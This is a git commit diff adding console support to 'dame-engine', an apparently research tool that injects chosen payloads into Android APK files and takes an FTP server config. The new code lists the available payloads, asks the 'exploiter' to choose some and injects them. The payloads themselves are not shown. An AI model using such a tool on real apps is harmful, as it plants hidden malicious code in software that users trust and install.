5e59b27ede204b21e65c5f38e713984259127a93
ermanno <esannini@gmail.com>
2015-02-09 14:54:06 +0100

    Complete Console support

--- dame-engine/src/main/java/it/unisannio/srss/dame/cli/Main.java
+++ dame-engine/src/main/java/it/unisannio/srss/dame/cli/Main.java
@@ -1,7 +1,13 @@
 package it.unisannio.srss.dame.cli;
 
+import it.unisannio.srss.dame.android.payloads.Payload;
+
 import java.io.File;
 import java.io.IOException;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Scanner;
+import java.util.StringTokenizer;
 
 import org.kohsuke.args4j.Argument;
 import org.kohsuke.args4j.CmdLineException;
@@ -11,14 +17,14 @@ import org.kohsuke.args4j.Option;
 public class Main {
 
 	@Option(name = "-o", usage = "apk file dest path")
-	private String apkDest = "(Default dest)";
+	private String apkOut = null;
 
-	@Option(name = "-config", usage = "ftp server file config",required=true)
-	private File config = new File(".");
+	@Option(name = "-config", usage = "ftp server file config", required = true)
+	private File config = null;
 
-	@Argument(required=true,usage="apk file source")
-	File apk=new File(".");
-	
+	@Argument(required = true, usage = "apk file source")
+	File apk = new File(".");
+
 	public static void main(String[] args) throws IOException {
 		new Main().doMain(args);
 	}
@@ -28,9 +34,34 @@ public class Main {
 		try {
 			// parse the arguments.
 			parser.parseArgument(args);
-			
-			//TODO waiting for Danilo's code
-			
+			Dame dame = new Dame();
+			String apkIn = apk.getAbsolutePath();
+			dame.setApkIn(apkIn);
+			if (apkOut != null) {
+				dame.setApkOut(apkOut);
+			}
+			String serverConfigPath = config.getAbsolutePath();
+			dame.setServerConfigPath(serverConfigPath);
+			List<Payload> payloads=dame.getFilteredPayloadList();
+			if(!payloads.isEmpty()){
+				System.out.println("Available payloads list. Insert payload's index for injection.\nYou can also specify more than one payload, splited by comma.");
+				int i=0;
+				for (Payload payload : payloads) {
+					System.out.println(i+" - "+payload.toString());
+					i++;
+				}
+				Scanner scanner=new Scanner(System.in);
+				String fromExploiter=scanner.nextLine()+",";
+				scanner.close();
+				StringTokenizer st=new StringTokenizer(fromExploiter);
+				List<Payload> toInject=new ArrayList<Payload>();
+				while(st.hasMoreTokens()){
+					toInject.add(payloads.get(Integer.parseInt(st.nextToken())));
+				}
+				dame.inject(toInject);
+			}else{
+				System.out.println("Not available payloads for your apk!");
+			}
 		} catch (CmdLineException e) {
 			// if there's a problem in the command line,
 			// you'll get this exception. this will report
